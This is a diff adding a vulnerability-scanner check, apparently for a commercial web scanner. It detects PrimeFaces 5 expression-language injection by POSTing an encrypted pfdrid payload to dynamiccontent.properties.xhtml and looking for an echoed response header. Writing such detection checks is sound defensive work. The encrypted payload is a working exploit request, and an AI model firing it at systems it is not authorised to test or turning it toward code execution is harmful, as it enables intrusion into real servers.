@@ -1,0 +1,72 @@
+#include helpers.inc;
+#include string_helpers.inc;
+// files to be tested
+var files = new Array();
+var lastJob = null;
+var vulnCount = 0;
+// **************************************************************************************							 
+function alert(uri, vxml, job, matchedText)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = uri;
+	ri.alertPath = "Scripts/" + vxml; 	
+	ri.setHttpInfo(job);
+	addHTTPJobToCrawler(job, 1, 1);
+	
+	AddReportItem(ri);	
+}							 			
+/***********************************************************************************/
+function testVulnOnDir(uri)
+{	
+	lastJob = new THTTPJob();
+	lastJob.verb = "POST";
+	lastJob.url  = scanURL;	
+	lastJob.uri  = uri + "dynamiccontent.properties.xhtml";
+	lastJob.request.addHeader("Content-Type", "application/x-www-form-urlencoded", true);
+	lastJob.request.body = 'pfdrt=sc&ln=primefaces&pfdrid=wQR45Hj4OwBRgKBtl5v%2FG4elO1lYWl%2BZfvjy1R79FgJ%2F3H%2BKYopezNVswr9KFx%2B8XaKwW6Tq3bG8OxNcX3CjCO5%2F1SsvFbW8gn6BL38vAt03Pz2scc3fGrGm3Vi7A7wdmqDjIu5mWyXWVXipcGirQgAAAAAAAAAA&primesecretchk=123445456';
+	lastJob.execute();
+	
+	if (!lastJob.wasError)
+	{
+		var check = lastJob.response.headerValue('primesecretchk');
+		//trace(check);
+		
+		if (check == "123445456")
+		{
+			alert(lastJob.uri, 'PrimeFaces5_EL_Injection.xml', lastJob);
+			return true;
+		}	
+	}
+}
+/***********************************************************************************/
+function prepareDirsToBeTested(list)
+{	
+	for (var i=0;i<list.count; i++){	
+		var sf = list.getFile(i);		
+		
+		if(!sf.ignored && sf.scanSiteFile)
+		{
+			if (sf.name == "javax.faces.resource")
+			{
+				//trace(sf.fullPath);
+				files.push(sf.fullPath);
+				
+				// don't test on more than 5 files
+				if (files.length > 5)
+					break;
+			}					
+		}
+	}
+}
+/***********************************************************************************/
+/* main entry point */
+var list = getNewFiles(0);
+prepareDirsToBeTested(list);
+if (files.length > 0) 
+{
+	for (var i=0; i<files.length; i++)
+	{
+		if (testVulnOnDir(files[i])) break;
+	}
+}
